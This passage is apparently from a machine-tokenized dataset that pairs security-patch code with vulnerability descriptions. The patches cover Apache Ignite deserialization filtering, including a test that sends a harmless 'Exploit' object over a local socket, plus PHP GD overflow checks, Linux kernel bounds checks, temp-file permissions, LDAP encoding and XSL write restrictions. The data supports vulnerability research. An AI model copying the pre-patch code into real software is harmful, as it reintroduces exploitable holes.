"@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testNoLists", "(", ")", "throws", "Exception", "{", "testExploit", "(", "true", ")", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testWhiteListIncluded", "(", ")", "throws", "Exception", "{", "String", "path", "=", "U", ".", "resolveIgnitePath", "(", "\"", "modules", "/", "core", "/", "src", "/", "test", "/", "config", "/", "class_list_exploit_included", ".", "txt", "\"", ").", "getPath", "(", ");", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_WHITELIST", ",", "path", ")", ";", "testExploit", "(", "true", ")", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testWhiteListExcluded", "(", ")", "throws", "Exception", "{", "String", "path", "=", "U", ".", "resolveIgnitePath", "(", "\"", "modules", "/", "core", "/", "src", "/", "test", "/", "config", "/", "class_list_exploit_excluded", ".", "txt", "\"", ").", "getPath", "(", ");", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_WHITELIST", ",", "path", ")", ";", "testExploit", "(", "false", ")", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testBlackListIncluded", "(", ")", "throws", "Exception", "{", "String", "path", "=", "U", ".", "resolveIgnitePath", "(", "\"", "modules", "/", "core", "/", "src", "/", "test", "/", "config", "/", "class_list_exploit_included", ".", "txt", "\"", ").", "getPath", "(", ");", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_BLACKLIST", ",", "path", ")", ";", "testExploit", "(", "false", ")", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testBlackListExcluded", "(", ")", "throws", "Exception", "{", "String", "path", "=", "U", ".", "resolveIgnitePath", "(", "\"", "modules", "/", "core", "/", "src", "/", "test", "/", "config", "/", "class_list_exploit_excluded", ".", "txt", "\"", ").", "getPath", "(", ");", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_BLACKLIST", ",", "path", ")", ";", "testExploit", "(", "true", ")", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testBothListIncluded", "(", ")", "throws", "Exception", "{", "String", "path", "=", "U", ".", "resolveIgnitePath", "(", "\"", "modules", "/", "core", "/", "src", "/", "test", "/", "config", "/", "class_list_exploit_included", ".", "txt", "\"", ").", "getPath", "(", ");", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_WHITELIST", ",", "path", ")", ";", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_BLACKLIST", ",", "path", ")", ";", "testExploit", "(", "false", ")", ";", "}", "/", "**", "*", "@", "param", "positive", "Positive", ".", "*", "/", "private", "void", "testExploit", "(", "boolean", "positive", ")", "throws", "Exception", "{", "try", "{", "Ignite", "ignite", "=", "startGrid", "(", ");", "SocketStreamer", "<", "Exploit", ",", "Integer", ",", "String", ">", "sockStmr", "=", "null", ";", "try", "(", "IgniteDataStreamer", "<", "Integer", ",", "String", ">", "stmr", "=", "ignite", ".", "dataStreamer", "(", "DEFAULT_CACHE_NAME", ")", ")", "{", "stmr", ".", "allowOverwrite", "(", "true", ")", ";", "stmr", ".", "autoFlushFrequency", "(", "10", ")", ";", "sockStmr", "=", "new", "SocketStreamer", "<", ">(", ");", "sockStmr", ".", "setIgnite", "(", "ignite", ")", ";", "sockStmr", ".", "setStreamer", "(", "stmr", ")", ";", "sockStmr", ".", "setPort", "(", "port", ")", ";", "sockStmr", ".", "setSingleTupleExtractor", "(", "new", "StreamSingleTupleExtractor", "<", "Exploit", ",", "Integer", ",", "String", ">", "()", "{", "@", "Override", "public", "Map", ".", "Entry", "<", "Integer", ",", "String", ">", "extract", "(", "Exploit", "msg", ")", "{", "return", "new", "IgniteBiTuple", "<", ">(", "1", ",", "\"", "val", "\"", ");", "}", "}", ");", "sockStmr", ".", "start", "(", ");", "try", "(", "Socket", "sock", "=", "new", "Socket", "(", "InetAddress", ".", "getLocalHost", "(", "),", "port", ")", ";", "OutputStream", "os", "=", "new", "BufferedOutputStream", "(", "sock", ".", "getOutputStream", "(", "))", ")", "{", "Marshaller", "marsh", "=", "new", "JdkMarshaller", "(", ");", "byte", "[", "]", "msg", "=", "marsh", ".", "marshal", "(", "new", "Exploit", "(", "))", ";", "os", ".", "write", "(", "msg", ".", "length", ">", ">>", "24", ")", ";", "os", ".", "write", "(", "msg", ".", "length", ">", ">>", "16", ")", ";", "os", ".", "write", "(", "msg", ".", "length", ">", ">>", "8", ")", ";", "os", ".", "write", "(", "msg", ".", "length", ")", ";", "os", ".", "write", "(", "msg", ")", ";", "}", "catch", "(", "IOException", "|", "IgniteCheckedException", "e", ")", "{", "throw", "new", "IgniteException", "(", "e", ")", ";", "}", "boolean", "res", "=", "GridTestUtils", ".", "waitForCondition", "(", "new", "GridAbsPredicate", "(", ")", "{", "@", "Override", "public", "boolean", "apply", "(", ")", "{", "return", "SHARED", ".", "get", "(", ");", "}", "}", ",", "3000L", ")", ";", "if", "(", "positive", ")", "assertTrue", "(", "res", ")", ";", "else", "assertFalse", "(", "res", ")", ";", "}", "finally", "{", "if", "(", "sockStmr", "!", "=", "null", ")", "sockStmr", ".", "stop", "(", ");", "}", "}", "finally", "{", "stopAllGrids", "(", ");", "}", "}", "/", "**", "*", "/", "private", "static", "class", "Exploit", "implements", "Serializable", "{", "/", "**", "*", "@", "param", "is", "Input", "stream", ".", "*", "/", "private", "void", "readObject", "(", "ObjectInputStream", "is", ")", "throws", "ClassNotFoundException", ",", "IOException", "{", "SHARED", ".", "set", "(", "true", ")", ";", "}", "}", "}", "@", "@", "-", "78", ",", "7", "+", "78", ",", "8", "@", "@", "public", "GridTestKernalContext", "(", "IgniteLogger", "log", ",", "IgniteConfiguration", "cfg", ")", "{", "U", ".", "allPluginProviders", "(", "),", "null", "import", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "ClassSetTest", ";", "suite", ".", "addTestSuite", "(", "ClassSetTest", ".", "class", ")", ";", "import", "org", ".", "apache", ".", "ignite", ".", "spi", ".", "discovery", ".", "tcp", ".", "DiscoveryUnmarshalVulnerabilityTest", ";", "suite", ".", "addTest", "(", "new", "TestSuite", "(", "DiscoveryUnmarshalVulnerabilityTest", ".", "class", ")", ");", "import", "org", ".", "apache", ".", "ignite", ".", "stream", ".", "socket", ".", "SocketStreamerUnmarshalVulnerabilityTest", ";", "suite", ".", "addTest", "(", "new", "TestSuite", "(", "SocketStreamerUnmarshalVulnerabilityTest", ".", "class", ")", ");</s>import", "org", ".", "apache", ".", "ignite", ".", "lang", ".", "IgnitePredicate", ";", "/", "**", "*", "Concurrency", "level", "for", "all", "concurrent", "hash", "maps", "created", "by", "Ignite", ".", "*", "/", "public", "static", "final", "String", "IGNITE_MAP_CONCURRENCY_LEVEL", "=", "\"", "IGNITE_MAP_CONCURRENCY_LEVEL", "\"", ";", "/", "**", "Maximum", "amount", "of", "concurrent", "updates", "per", "system", "thread", "in", "atomic", "caches", "in", "case", "of", "PRIMARY_SYNC", "or", "FULL_ASYNC", "*", "write", "synchronization", "mode", ".", "If", "this", "limit", "is", "exceeded", "then", "update", "will", "be", "performed", "with", "FULL_SYNC", "*", "synchronization", "mode", ".", "If", "value", "is", "{", "@", "code", "0", "}", "then", "limit", "is", "unbounded", ".", "*", "/", "public", "static", "final", "String", "IGNITE_ATOMIC_CACHE_MAX_CONCURRENT_DHT_UPDATES", "=", "\"", "IGNITE_ATOMIC_CACHE_MAX_CONCURRENT_DHT_UPDATES", "\"", ";", "/", "**", "Number", "of", "times", "pending", "cache", "objects", "will", "be", "dumped", "to", "the", "log", "in", "case", "of", "partition", "exchange", "timeout", ".", "*", "/", "public", "static", "final", "String", "IGNITE_DUMP_PENDING_OBJECTS_THRESHOLD", "=", "\"", "IGNITE_DUMP_PENDING_OBJECTS_THRESHOLD", "\"", ";", "/", "**", "Returns", "true", "for", "system", "properties", "only", "avoiding", "sending", "sensitive", "information", ".", "*", "/", "private", "static", "final", "IgnitePredicate", "<", "Map", ".", "Entry", "<", "String", ",", "String", ">", ">", "PROPS_FILTER", "=", "new", "IgnitePredicate", "<", "Map", ".", "Entry", "<", "String", ",", "String", ">", ">(", ")", "{", "@", "Override", "public", "boolean", "apply", "(", "final", "Map", ".", "Entry", "<", "String", ",", "String", ">", "entry", ")", "{", "final", "String", "key", "=", "entry", ".", "getKey", "(", ");", "return", "key", ".", "startsWith", "(", "\"", "java", ".", "\")", "|", "|", "key", ".", "startsWith", "(", "\"", "os", ".", "\")", "|", "|", "key", ".", "startsWith", "(", "\"", "user", ".", "\")", ";", "}", "}", ";", "/", "**", "/", "**", "*", "*", "/", "public", "static", "final", "String", "IGNITE_WAL_ARCHIVE_COMPACT_SKIP_DELTA_RECORD", "=", "\"", "IGNITE_WAL_ARCHIVE_COMPACT_SKIP_DELTA_RECORD", "\"", ";", "/", "**", "*", "Does", "the", "same", "as", "{", "@", "link", "#", "snapshot", "(", ")}", "but", "filters", "out", "*", "possible", "sensitive", "user", "data", ".", "*", "*", "@", "return", "Snapshot", "of", "system", "properties", ".", "*", "/", "@", "SuppressWarnings", "(", "\"", "unchecked", "\"", ")", "public", "static", "Properties", "safeSnapshot", "(", ")", "{", "final", "Properties", "props", "=", "snapshot", "(", ");", "final", "Iterator", "<", "Map", ".", "Entry", "<", "Object", ",", "Object", ">", ">", "iter", "=", "props", ".", "entrySet", "(", ").", "iterator", "(", ");", "while", "(", "iter", ".", "hasNext", "(", "))", "{", "final", "Map", ".", "Entry", "entry", "=", "iter", ".", "next", "(", ");", "if", "(", "!", "PROPS_FILTER", ".", "apply", "(", "entry", ")", ")", "iter", ".", "remove", "(", ");", "}", "return", "props", ";", "}", "List", "<", "PluginProvider", ">", "plugins", "marshCtx", "=", "new", "MarshallerContextImpl", "(", "plugins", ")", ";", "plugins", "/", "**", "*", "/", "private", "static", "final", "String", "CLS_NAMES_FILE", "=", "\"", "META", "-", "INF", "/", "classnames", ".", "properties", "\"", ";", "/", "**", "*", "/", "private", "static", "final", "String", "JDK_CLS_NAMES_FILE", "=", "\"", "META", "-", "INF", "/", "classnames", "-", "jdk", ".", "properties", "\"", ";", "public", "MarshallerContextImpl", "(", "@", "Nullable", "Collection", "<", "PluginProvider", ">", "plugins", ")", "{", "return", "U", ".", "forName", "(", "clsName", ",", "ldr", ")", ";", "super", "(", "null", ")", ";", "super", "(", "plugins", ")", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "jdk", ".", "JdkMarshaller", ";", "/", "**", "JDK", "marshaller", ".", "*", "/", "static", "final", "JdkMarshaller", "JDK_MARSH", "=", "new", "JdkMarshaller", "(", ");", "import", "static", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "marshaller", ".", "optimized", ".", "OptimizedMarshallerUtils", ".", "JDK_MARSH", ";", "return", "JDK_MARSH", ".", "unmarshal", "(", "this", ",", "clsLdr", ")", ";", "classDescriptor", "(", "clsMap", ",", "U", ".", "forName", "(", "readUTF", "(", "),", "clsLdr", ")", ",", "ctx", ",", "mapper", ")", ":", "import", "static", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "marshaller", ".", "optimized", ".", "OptimizedMarshallerUtils", ".", "JDK_MARSH", ";", "JDK_MARSH", ".", "marshal", "(", "obj", ",", "this", ")", ";", "this", ".", "marshallerCtx", "=", "new", "MarshallerContextImpl", "(", "null", ")", ";", "marsh", ".", "setContext", "(", "new", "MarshallerContextImpl", "(", "null", ")", ");", "private", "final", "Marshaller", "jdkMarshaller", "=", "new", "JdkMarshaller", "(", ");", "return", "U", ".", "unmarshal", "(", "jdkMarshaller", ",", "bytes", ",", "null", ")", ";", "U", ".", "marshal", "(", "jdkMarshaller", ",", "obj", ",", "out", ")", ";", "import", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "util", ".", "nio", ".", "GridNioSession", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "Marshaller", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "jdk", ".", "JdkMarshaller", ";", "import", "static", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "util", ".", "nio", ".", "GridNioSessionMetaKey", ".", "MARSHALLER", ";", "/", "**", "JDK", "marshaller", ".", "*", "/", "private", "final", "Marshaller", "jdkMarshaller", "=", "new", "JdkMarshaller", "(", ");", "/", "**", "*", "@", "return", "JDK", "marshaller", ".", "*", "/", "Marshaller", "jdkMarshaller", "(", ")", "{", "return", "jdkMarshaller", ";", "}", "/", "**", "*", "Returns", "marshaller", ".", "*", "*", "@", "param", "ses", "Session", ".", "*", "@", "return", "Marshaller", ".", "*", "/", "GridClientMarshaller", "marshaller", "(", "GridNioSession", "ses", ")", "{", "GridClientMarshaller", "marsh", "=", "ses", ".", "meta", "(", "MARSHALLER", ".", "ordinal", "(", "))", ";", "assert", "marsh", "!", "=", "null", ";", "return", "marsh", ";", "}", "GridNioParser", "parser", "=", "new", "GridTcpRestParser", "(", "false", ")", ";", "objIn", "=", "new", "JdkMarshallerObjectInputStream", "(", "new", "JdkMarshallerInputStreamWrapper", "(", "in", ")", ",", "clsLdr", ")", ";", "JdkMarshallerObjectInputStream", "(", "InputStream", "in", ",", "ClassLoader", "clsLdr", ")", "throws", "IOException", "{", "return", "U", ".", "forName", "(", "desc", ".", "getName", "(", "),", "clsLdr", ")", ";", "private", "final", "Marshaller", "marsh", "=", "new", "JdkMarshaller", "(", ");", "private", "Ignite", "ignite", ";", "private", "static", "class", "DefaultConverter", "<", "T", ">", "implements", "SocketMessageConverter", "<", "T", ">", "{", "marsh", "=", "MarshallerUtils", ".", "jdkMarshaller", "(", "igniteInstanceName", ")", ";", "MarshallerContextImpl", "marshallerContext", "=", "new", "MarshallerContextImpl", "(", "null", ")", ";", "import", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "marshaller", ".", "optimized", ".", "OptimizedMarshaller", ";", "MarshallerContextImpl", "marshCtx", "=", "new", "MarshallerContextImpl", "(", "null", ")", ";", "MarshallerContextImpl", "marshCtx", "=", "new", "MarshallerContextImpl", "(", "null", ")", ";", "MarshallerContextImpl", "ctx", "=", "new", "MarshallerContextImpl", "(", "null", ")", ";", "MarshallerContextImpl", "ctx", "=", "new", "MarshallerContextImpl", "(", "null", ")", ";", "MarshallerContextImpl", "ctx", "=", "new", "MarshallerContextImpl", "(", "null", ")", ";", "super", "(", "plugins", ")", ";", "U", ".", "allPluginProviders", "(", ")"], "docstring_tokens": ["sends", "a", "specially", "prepared", "form", "of", "a", "serialized", "object", "to", "one", "of", "the", "deserialization", "endpoints", "of", "some", "Ignite", "components"]}
{"contents": ["empty"], "code_tokens": ["size_t", "weights_size", ";", "if", "(", "overflow2", "(", "windows_size", ",", "sizeof", "(", "double", ")", "))", "{", "return", "NULL", ";", "}", "else", "{", "weights_size", "=", "windows_size", "*", "sizeof", "(", "double", ")", ";", "}", "res", "-", ">", "ContribRow", "[", "u", "]", ".", "Weights", "=", "(", "double", "*", ")", "gdMalloc", "(", "weights_size", ")", ";", "if", "(", "res", "-", ">", "ContribRow", "[", "u", "]", ".", "Weights", "=", "=", "NULL", ")", "{", "for", "(", "i", "=", "0", ";", "i", "<", "u", ";", "i", "+", "+)", "{", "-", "-", "TEST", "-", "-", "Bug", "#", "77269", "(", "Potential", "unsigned", "underflow", "in", "gdImageScale", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "'", "gd", "'", "))", "die", "(", "'", "skip", "gd", "extension", "not", "available", "'", ");", "if", "(", "getenv", "(", "\"", "SKIP_SLOW_TESTS", "\"", "))", "die", "(", "\"", "skip", "slow", "test", "\"", ");", "?", ">", "-", "-", "INI", "-", "-", "memory_limit", "=", "2G", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "im", "=", "imagecreate", "(", "2", "*", "*", "28", ",", "1", ")", ";", "if", "(", "is_resource", "(", "$", "im", ")", ")", "{", "imagescale", "(", "$", "im", ",", "1", ",", "1", ",", "IMG_TRIANGLE", ")", ";", "}", "?", ">", "=", "==", "DONE", "=", "==", "-", "-", "EXPECTF", "-", "-", "Warning", ":", "imagecreate", "(", "):", "%", "S", "product", "of", "memory", "allocation", "multiplication", "would", "exceed", "INT_MAX", ",", "failing", "operation", "gracefully", "in", "%", "s", "on", "line", "%", "d", "=", "==", "DONE", "=", "==</s>int", "overflow_error", "=", "0", ";", "if", "(", "overflow2", "(", "windows_size", ",", "sizeof", "(", "double", ")", "))", "{", "overflow_error", "=", "1", ";", "}", "else", "{", "res", "-", ">", "ContribRow", "[", "u", "]", ".", "Weights", "=", "(", "double", "*", ")", "gdMalloc", "(", "windows_size", "*", "sizeof", "(", "double", ")", ");", "}", "if", "(", "overflow_error", "=", "=", "1", "|", "|", "res", "-", ">", "ContribRow", "[", "u", "]", ".", "Weights", "=", "=", "NULL", ")", "{", "u", "-", "-;", "for", "(", "i", "=", "0", ";", "i", "<", "=", "u", ";", "i", "+", "+)", "{"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "image", "file"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "sdreq", "-", ">", "tlv_len", "is", "u8", ",", "takes", "uri_len", ",", "+", "3", "for", "header", ",", "+", "1", "for", "NULL", "*", "/", "if", "(", "WARN_ON_ONCE", "(", "uri_len", ">", "U8_MAX", "-", "4", ")", ")", "return", "NULL", ";", "[", "NFC_SDP_ATTR_URI", "]", "=", "{", ".", "type", "=", "NLA_STRING", ",", ".", "len", "=", "U8_MAX", "-", "4", "}", ",</s>[", "NFC_SDP_ATTR_URI", "]", "=", "{", ".", "type", "=", "NLA_STRING", "}", ","], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["import", "java", ".", "nio", ".", "file", ".", "attribute", ".", "FileAttribute", ";", "import", "java", ".", "nio", ".", "file", ".", "attribute", ".", "PosixFileAttributeView", ";", "import", "java", ".", "nio", ".", "file", ".", "attribute", ".", "PosixFilePermission", ";", "import", "java", ".", "nio", ".", "file", ".", "attribute", ".", "PosixFilePermissions", ";", "import", "java", ".", "util", ".", "EnumSet", ";", "private", "static", "final", "FileAttribute", "[", "]", "TMPFILE_ATTRIBUTES", "=", "new", "FileAttribute", "[", "]", "{", "PosixFilePermissions", ".", "asFileAttribute", "(", "EnumSet", ".", "of", "(", "PosixFilePermission", ".", "OWNER_READ", ",", "PosixFilePermission", ".", "OWNER_WRITE", ")", ")", "}", ";", "private", "static", "final", "FileAttribute", "[", "]", "NO_TMPFILE_ATTRIBUTES", "=", "new", "FileAttribute", "[", "0", "]", ";", "*", "<", "p", ">", "If", "the", "filesystem", "where", "the", "temporary", "file", "is", "created", "*", "supports", "POSIX", "permissions", ",", "the", "file", "will", "only", "be", "readable", "and", "*", "writable", "by", "the", "current", "user", ".", "</", "p", ">", "*", "*", "<", "p", ">", "If", "the", "filesystem", "where", "the", "temporary", "file", "is", "created", "*", "supports", "POSIX", "permissions", ",", "the", "file", "will", "only", "be", "readable", "and", "*", "writable", "by", "the", "current", "user", ".", "</", "p", ">", "*", "*", "<", "p", ">", "If", "the", "filesystem", "where", "the", "temporary", "file", "is", "created", "*", "supports", "POSIX", "permissions", ",", "the", "file", "will", "only", "be", "readable", "and", "*", "writable", "by", "the", "current", "user", ".", "</", "p", ">", "*", "final", "Path", "parentPath", "=", "new", "File", "(", "parent", ")", ".", "toPath", "(", ");", "final", "PosixFileAttributeView", "parentPosixAttributes", "=", "Files", ".", "getFileAttributeView", "(", "parentPath", ",", "PosixFileAttributeView", ".", "class", ")", ";", "result", "=", "Files", ".", "createTempFile", "(", "parentPath", ",", "prefix", ",", "suffix", ",", "parentPosixAttributes", "!", "=", "null", "?", "TMPFILE_ATTRIBUTES", ":", "NO_TMPFILE_ATTRIBUTES", ")", ".", "toFile", "(", ");", "+", "parent", ",", "e", ")", ";", "*", "<", "p", ">", "If", "the", "filesystem", "where", "the", "temporary", "file", "is", "created", "*", "supports", "POSIX", "permissions", ",", "the", "file", "will", "only", "be", "readable", "and", "*", "writable", "by", "the", "current", "user", ".", "</", "p", ">", "*", "import", "java", ".", "nio", ".", "file", ".", "attribute", ".", "PosixFileAttributeView", ";", "import", "java", ".", "nio", ".", "file", ".", "attribute", ".", "PosixFilePermission", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "containsInAnyOrder", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "hasSize", ";", "final", "PosixFileAttributeView", "attributes", "=", "Files", ".", "getFileAttributeView", "(", "tmp1", ".", "toPath", "(", "),", "PosixFileAttributeView", ".", "class", ")", ";", "if", "(", "attributes", "!", "=", "null", ")", "{", "final", "Set", "<", "PosixFilePermission", ">", "perm", "=", "attributes", ".", "readAttributes", "(", ").", "permissions", "(", ");", "assertThat", "(", "perm", ",", "containsInAnyOrder", "(", "PosixFilePermission", ".", "OWNER_READ", ",", "PosixFilePermission", ".", "OWNER_WRITE", ")", ");", "assertThat", "(", "perm", ",", "hasSize", "(", "2", ")", ");", "}</s>result", "=", "File", ".", "createTempFile", "(", "prefix", ",", "suffix", ",", "new", "File", "(", "parent", ")", ");"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "op", "-", ">", "yes", "<", "4", "|", "|", "op", "-", ">", "yes", "&", "3", ")", "const", "void", "*", "bc", "=", "bytecode", ";", "const", "struct", "inet_diag_bc_op", "*", "op", "=", "bc", ";", "if", "(", "op", "-", ">", "no", "<", "4", "|", "|", "op", "-", ">", "no", ">", "len", "+", "4", "|", "|", "op", "-", ">", "no", "&", "3", ")", "if", "(", "op", "-", ">", "yes", "<", "4", "|", "|", "op", "-", ">", "yes", ">", "len", "+", "4", "|", "|", "op", "-", ">", "yes", "&", "3", ")", "return", "-", "EINVAL", ";</s>if", "(", "op", "-", ">", "yes", "<", "4", ")", "const", "unsigned", "char", "*", "bc", "=", "bytecode", ";", "struct", "inet_diag_bc_op", "*", "op", "=", "(", "struct", "inet_diag_bc_op", "*", ")", "bc", ";", "if", "(", "op", "-", ">", "yes", "<", "4", "|", "|", "op", "-", ">", "yes", ">", "len", "+", "4", ")", "return", "-", "EINVAL", ";", "if", "(", "op", "-", ">", "no", "<", "4", "|", "|", "op", "-", ">", "no", ">", "len", "+", "4", ")", "if", "(", "op", "-", ">", "yes", "<", "4", "|", "|", "op", "-", ">", "yes", ">", "len", "+", "4", ")", "return", "-", "EINVAL", ";"], "docstring_tokens": ["byte-size", "loads", "and", "stores", "(for", "example)"]}
{"contents": ["empty"], "code_tokens": ["final", "String", "value", "=", "LdapEncoder", ".", "filterEncode", "(", "properties", ".", "get", "(", "key", ")", ");</s>final", "String", "value", "=", "LdapEncoder", ".", "nameEncode", "(", "properties", ".", "get", "(", "key", ")", ");"], "docstring_tokens": ["via", "a", "crafted", "username"]}
{"contents": ["empty"], "code_tokens": ["-", "Improved", "XSL", "extension", ":", ".", "Added", "XsltProcessor", ":", ":", "setSecurityPrefs", "(", "$", "options", ")", "and", "getSecurityPrefs", "(", ")", "to", "define", "forbidden", "operations", "within", "XSLT", "stylesheets", ",", "default", "is", "not", "to", "enable", "any", "write", "operations", "from", "XSLT", "anymore", ".", "Bug", "#", "54446", "-", "Write", "operations", "within", "XSLT", "(", "for", "example", "with", "the", "extension", "sax", ":", "output", ")", "are", "disabled", "by", "default", ".", "You", "can", "define", "what", "is", "forbidden", "with", "the", "method", "XsltProcess", ":", ":", "setSecurityPrefs", "(", "$", "options", ")", "intern", "-", ">", "securityPrefs", "=", "XSL_SECPREF_WRITE_FILE", "|", "XSL_SECPREF_WRITE_NETWORK", "|", "XSL_SECPREF_CREATE_DIRECTORY", ";", "REGISTER_LONG_CONSTANT", "(", "\"", "XSL_SECPREF_NONE", "\"", ",", "XSL_SECPREF_NONE", ",", "CONST_CS", "|", "CONST_PERSISTENT", ")", ";", "REGISTER_LONG_CONSTANT", "(", "\"", "XSL_SECPREF_READ_FILE", "\"", ",", "XSL_SECPREF_READ_FILE", ",", "CONST_CS", "|", "CONST_PERSISTENT", ")", ";", "REGISTER_LONG_CONSTANT", "(", "\"", "XSL_SECPREF_WRITE_FILE", "\"", ",", "XSL_SECPREF_WRITE_FILE", ",", "CONST_CS", "|", "CONST_PERSISTENT", ")", ";", "REGISTER_LONG_CONSTANT", "(", "\"", "XSL_SECPREF_CREATE_DIRECTORY", "\"", ",", "XSL_SECPREF_CREATE_DIRECTORY", ",", "CONST_CS", "|", "CONST_PERSISTENT", ")", ";", "REGISTER_LONG_CONSTANT", "(", "\"", "XSL_SECPREF_READ_NETWORK", "\"", ",", "XSL_SECPREF_READ_NETWORK", ",", "CONST_CS", "|", "CONST_PERSISTENT", ")", ";", "REGISTER_LONG_CONSTANT", "(", "\"", "XSL_SECPREF_WRITE_NETWORK", "\"", ",", "XSL_SECPREF_WRITE_NETWORK", ",", "CONST_CS", "|", "CONST_PERSISTENT", ")", ";", "#", "include", "<", "libxslt", "/", "security", ".", "h", ">", "#", "define", "XSL_SECPREF_NONE", "0", "#", "define", "XSL_SECPREF_READ_FILE", "2", "#", "define", "XSL_SECPREF_WRITE_FILE", "4", "#", "define", "XSL_SECPREF_CREATE_DIRECTORY", "8", "#", "define", "XSL_SECPREF_READ_NETWORK", "16", "#", "define", "XSL_SECPREF_WRITE_NETWORK", "32", "long", "securityPrefs", ";", "PHP_FUNCTION", "(", "xsl_xsltprocessor_set_security_prefs", ")", ";", "PHP_FUNCTION", "(", "xsl_xsltprocessor_get_security_prefs", ")", ";", "ZEND_BEGIN_ARG_INFO_EX", "(", "arginfo_xsl_xsltprocessor_set_security_prefs", ",", "0", ",", "0", ",", "1", ")", "ZEND_ARG_INFO", "(", "0", ",", "securityPrefs", ")", "ZEND_END_ARG_INFO", "(", ");", "ZEND_BEGIN_ARG_INFO_EX", "(", "arginfo_xsl_xsltprocessor_get_security_prefs", ",", "0", ",", "0", ",", "0", ")", "ZEND_END_ARG_INFO", "(", ");", "PHP_FALIAS", "(", "setSecurityPrefs", ",", "xsl_xsltprocessor_set_security_prefs", ",", "arginfo_xsl_xsltprocessor_set_security_prefs", ")", "PHP_FALIAS", "(", "getSecurityPrefs", ",", "xsl_xsltprocessor_get_security_prefs", ",", "arginfo_xsl_xsltprocessor_get_security_prefs", ")", "/", "*", "Add", "security", "checks", "*", "/", "/", "*", "XSLT_SECPREF_READ_FILE", "and", "XSLT_SECPREF_READ_NETWORK", "aren", "'", "t", "needed", "*", "/", "xsltSecurityPrefsPtr", "secPrefs", "=", "xsltNewSecurityPrefs", "(", ");", "if", "(", "intern", "-", ">", "securityPrefs", "&", "XSL_SECPREF_READ_FILE", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_READ_FILE", ",", "xsltSecurityForbid", ")", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Can", "'", "t", "set", "libxslt", "security", "properties", "\"", ");", "}", "}", "if", "(", "intern", "-", ">", "securityPrefs", "&", "XSL_SECPREF_WRITE_FILE", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_WRITE_FILE", ",", "xsltSecurityForbid", ")", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Can", "'", "t", "set", "libxslt", "security", "properties", "\"", ");", "}", "}", "if", "(", "intern", "-", ">", "securityPrefs", "&", "XSL_SECPREF_CREATE_DIRECTORY", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_CREATE_DIRECTORY", ",", "xsltSecurityForbid", ")", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Can", "'", "t", "set", "libxslt", "security", "properties", "\"", ");", "}", "}", "if", "(", "intern", "-", ">", "securityPrefs", "&", "XSL_SECPREF_READ_NETWORK", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_READ_NETWORK", ",", "xsltSecurityForbid", ")", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Can", "'", "t", "set", "libxslt", "security", "properties", "\"", ");", "}", "}", "if", "(", "intern", "-", ">", "securityPrefs", "&", "XSL_SECPREF_WRITE_NETWORK", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_WRITE_NETWORK", ",", "xsltSecurityForbid", ")", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Can", "'", "t", "set", "libxslt", "security", "properties", "\"", ");", "}", "}", "if", "(", "0", "!", "=", "xsltSetCtxtSecurityPrefs", "(", "secPrefs", ",", "ctxt", ")", ")", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Can", "'", "t", "set", "libxslt", "security", "handler", "\"", ");", "xsltFreeSecurityPrefs", "(", "secPrefs", ")", ";", "/", "*", "{", "{{", "proto", "long", "xsl_xsltprocessor_set_security_prefs", "(", "long", "securityPrefs", ")", "*", "/", "PHP_FUNCTION", "(", "xsl_xsltprocessor_set_security_prefs", ")", "{", "zval", "*", "id", ";", "xsl_object", "*", "intern", ";", "DOM_GET_THIS", "(", "id", ")", ";", "long", "securityPrefs", ",", "oldSecurityPrefs", ";", "if", "(", "zend_parse_parameters_ex", "(", 